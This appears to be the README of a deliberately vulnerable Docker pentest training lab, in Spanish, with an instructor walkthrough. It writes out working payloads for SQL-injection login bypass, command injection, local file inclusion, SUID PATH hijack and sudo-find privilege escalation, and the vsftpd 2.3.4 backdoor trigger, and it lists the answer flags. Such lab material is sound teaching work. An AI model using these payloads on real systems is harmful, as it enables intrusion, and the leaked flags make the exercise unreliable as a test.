# Lab DEMO — ejercicio de pentest en un contenedor

> **Solo para uso de entrenamiento autorizado.** Vulnerable a propósito. Escucha
> solo en `127.0.0.1`. No lo expongas a ninguna red no confiable.

Un contenedor Docker con dos servicios. El alumno encadena:
recon FTP anónimo → bypass de login web por SQLi → command injection (foothold como
`www-data`) → escalada de privilegios → `root` → flag en `/root/flag.txt`.

Rutas extra para la clase: un **Local File Inclusion** en la página de diagnóstico,
y un **privesc alternativo** vía `sudo find` (GTFOBins) además del SUID PATH hijack.

## Servicios
| Puerto | Servicio | Rol |
|--------|----------|-----|
| 21 (+21000-21010 pasivo) | FTP "vsftpd 2.3.4", anónimo | recon / pista **+ backdoor 2.3.4** |
| 6200 | (se abre al disparar el backdoor) | shell **root** sin autenticación |
| 80 | Apache + PHP + SQLite | bypass de login por SQLi → command injection (RCE) + LFI |

## Ejecución
Preferí el launcher de la raíz (`../lab.sh` / `../lab.ps1`), que levanta este lab
junto con el examen e imprime los puertos. De forma independiente:
```bash
docker compose up -d --build
docker compose port lab 80     # web  -> 127.0.0.1:<puerto aleatorio>
docker compose port lab 21     # ftp  -> 127.0.0.1:<puerto aleatorio>
```
Los puertos se publican en **puertos host libres al azar en `127.0.0.1`** para que
nunca choquen. Los puertos de datos del FTP pasivo quedan fijos en **21000-21010**.

Reiniciar entre alumnos (elimina contenedor **y** red, el estado es efímero):
```bash
docker compose down && docker compose up -d --build
```

## Solución prevista (solo instructor)
1. **Recon FTP** — en Linux el target es un host en `172.30.0.10`
   (`nmap -sV 172.30.0.10`; el banner anuncia `vsftpd 2.3.4`). `ftp 172.30.0.10`
   (o `ftp 127.0.0.1 <puerto>` en Win/Mac), ingresá como `anonymous`, leé `notes.txt`.
   Apunta a la herramienta web y menciona un job `backup` que corre como root.
2. **Bypass de login por SQLi** — la herramienta de diagnóstico está detrás de un
   login en `http://127.0.0.1:<puerto>/login.php`. La query concatena el input directo:
   ```
   username: admin'--
   password: (cualquiera)
   ```
   o `' OR '1'='1'-- `. Al funcionar se setea la sesión y llegás a `index.php`.
3. **Foothold (command injection)** — detrás del login,
   `index.php?host=127.0.0.1;id`. Input sin sanitizar → `system()`. Caés como
   `www-data`. User flag: `/var/www/user.txt`.
4. **LFI (ruta lateral, solo demo)** — el link `Help` carga páginas con
   `include($_GET['page'])`. `index.php?page=/etc/passwd` lee archivos arbitrarios;
   la propia página de ayuda da la pista del privesc por `sudo`.
5. **Privesc — dos caminos a root:**
   - **SUID PATH hijack** — `find / -perm -4000 2>/dev/null` → `/usr/local/bin/backup`
     llama a `tar` sin ruta absoluta:
     ```bash
     cd /tmp
     echo -e '#!/bin/bash\n/bin/bash -p' > tar && chmod +x tar
     PATH=/tmp:$PATH /usr/local/bin/backup
     ```
   - **sudo GTFOBins** — `sudo -l` muestra que `www-data` puede correr `find` como root:
     ```bash
     sudo find . -exec /bin/sh \; -quit
     ```
   Luego `cat /root/flag.txt`.

## Root instantáneo alternativo — backdoor de vsftpd 2.3.4 (CVE famoso)
`nmap -sV` identifica el banner del FTP como **vsftpd 2.3.4**. Esa versión incluyó un
backdoor: un `USER` que termina en `:)` abre una shell **root** sin autenticación en
tcp/6200. Esto cortocircuita toda la cadena directo a root — ideal para mostrar cómo
funciona el fingerprint de versión → CVE conocido.

Metasploit:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.30.0.10      # en Win/Mac: 127.0.0.1, y setear RPORT al puerto FTP mapeado
run
```
Manual:
```bash
# disparar por el canal de control
printf 'USER evil:)\r\nPASS x\r\n' | nc 172.30.0.10 21
# atrapar la shell root
nc 172.30.0.10 6200
id   # uid=0(root)
```

## Flags
- user: `FLAG{foothold_as_www_data_via_command_injection}`
- root: `FLAG{r00t_via_suid_path_hijack_gg}`
